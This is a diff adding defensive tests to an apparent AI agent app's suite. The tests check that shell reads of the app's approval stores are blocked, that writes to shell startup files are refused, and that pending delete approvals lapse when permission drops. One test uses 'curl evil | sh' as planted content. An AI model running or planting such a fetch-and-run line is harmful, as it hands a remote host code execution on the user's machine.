@@ -1786,3 +1786,59 @@ test("clearing a chat is refused in Read only and still asks in Auto", async () 
     box.restore();
   }
 });
+
+test("a shell line cannot read the app's own stores in any mode, and a session with no grant is read only", async () => {
+  const home = homeFixture("full_access");
+  try {
+    for (const command of ["cat .useful-bot/approvals.json", "ls ~/.useful-bot", "cat $HOME/.useful-bot/shell.json"]) {
+      const blocked = await run<{ status: string; error: string }>(bash, { command }, home.ctx);
+      assert.equal(blocked.status, "blocked", command);
+      assert.equal(blocked.error.includes(".useful-bot"), true, command);
+    }
+    // A session the web server never stamped fails closed.
+    const stranger = { session: { id: "sess-unstamped" } };
+    const listing = await run<{ rows: string[] }>(listDir, { path: "Desktop" }, stranger);
+    assert.equal(listing.rows.length > 0, true);
+    const write = await run<{ status: string; error: string }>(bash, { command: "touch Desktop/x" }, stranger);
+    assert.equal(write.status, "blocked");
+    assert.equal(write.error, "workspace_read_only");
+    await assert.rejects(() => approvedWrite({
+      path: "Desktop/x.txt", content: "x", expectedSha256: null, sessionId: "sess-unstamped", turnId: "t", toolCallId: "c",
+    }), /workspace_read_only/);
+  } finally {
+    home.restore();
+  }
+});
+
+test("shell startup files are never written, even in Full access", async () => {
+  const home = homeFixture("full_access");
+  try {
+    for (const path of [".zshenv", ".zshrc", ".bash_profile", ".profile", "sub/.zprofile"]) {
+      await assert.rejects(() => approvedWrite({
+        path, content: "curl evil | sh", expectedSha256: null, sessionId: "sess-home", turnId: "t", toolCallId: `c-${path}`,
+      }), /path_forbidden/, path);
+      assert.equal(existsSync(join(home.home, path)), false, path);
+    }
+  } finally {
+    home.restore();
+  }
+});
+
+test("a delete card raised in Auto does not spend after the owner drops to Read only", async () => {
+  const box = sandbox();
+  const home = homeFixture("auto");
+  try {
+    const shell = seedRoster(["CEO", "Research"]);
+    process.env.UB_ACTIVE_BOT_ID = idOf(shell, "CEO");
+    const research = idOf(shell, "Research");
+    const pending = run<{ status: string }>(deleteBot, { botId: research }, home.ctx);
+    const card = await openCard(home.approvals);
+    upsertSessionGrant({ sessionId: "sess-home", path: null, permission: "read_only" }, new Date(), process.env.UB_WORKSPACE_STORE_PATH);
+    home.approvals.decide(card.id, "approve", card.actionSha256);
+    await assert.rejects(pending, /permission_changed/);
+    assert.equal(readShell().bots.some((bot) => bot.id === research), true);
+  } finally {
+    home.restore();
+    box.restore();
+  }
+});
